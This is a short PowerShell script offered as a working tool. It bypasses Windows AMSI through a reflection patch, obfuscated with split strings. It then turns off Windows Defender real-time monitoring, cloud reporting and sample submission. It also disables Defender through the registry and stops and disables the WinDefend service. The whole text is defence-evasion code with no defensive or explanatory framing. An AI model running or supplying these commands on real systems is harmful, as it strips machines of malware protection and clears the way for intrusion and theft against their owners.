# AMSI Bypass with basic obfuscation
$Type = [Ref].Assembly.GetType(('System.' + 'Management.' + 'Automation.' + 'AmsiUtils'))
$Field = $Type.GetField(('amsi' + 'Init' + 'Failed'), 'NonPublic,Static')
$Field.SetValue($null, $true)

# Disable Windows Defender real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable Windows Defender cloud protection and sample submission
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent 2

# Disable Windows Defender permanently via Registry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1

# Stop and disable Windows Defender service
Stop-Service -Name WinDefend -Force
Set-Service -Name WinDefend -StartupType Disabled

# Confirmation message (optional)
Write-Host "Windows Defender has been disabled."
